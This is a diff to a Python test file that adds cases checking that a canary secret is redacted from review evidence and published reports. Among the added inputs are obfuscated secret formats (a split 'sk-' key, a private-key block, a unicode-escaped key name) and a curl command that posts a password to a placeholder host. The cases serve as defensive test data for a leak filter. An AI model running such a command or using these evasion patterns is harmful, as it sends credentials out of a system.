@@ -74,6 +74,11 @@ class RoleReviewTests(unittest.TestCase):
         cases += [prefix + json.dumps({key: canary}) + suffix
                   for key in ("/prod/db/password", "password[0]", "api key (prod)")
                   for prefix, suffix in (("", ""), ("Evidence: ", "\nPUBLIC_AFTER"))]
+        cases += [
+            f'Evidence: {{"password": "sk-" + "{canary}"}}',
+            f'Evidence: {{"password": "-----BEGIN " + "PRIVATE KEY-----\\n{canary}\\n-----END PRIVATE KEY-----"}}',
+            f'Evidence: {{"\\u0073k-{canary}/password": "public"}}',
+        ]
         for index, evidence in enumerate(cases):
             with self.subTest(case=index):
                 self.work = self.root / f"publication-{index}"
@@ -135,6 +140,10 @@ VERDICT: PASS
         ]
         reports += [f"```dotenv\npassword=prefix{opening}{canary}\n```\nPUBLIC_AFTER\nVERDICT: PASS\n"
                     for opening in ("[", "{")]
+        reports += [
+            f"curl -d 'password={canary}' https://example.invalid\nPUBLIC_AFTER\nVERDICT: PASS\n",
+            f"```dotenv\npassword=prefix[{canary}\n```\n[PUBLIC_AFTER](https://example.invalid)\nVERDICT: PASS\n",
+        ]
         for report in reports:
             with self.subTest(report=report):
                 output = self.work / "chair.md"
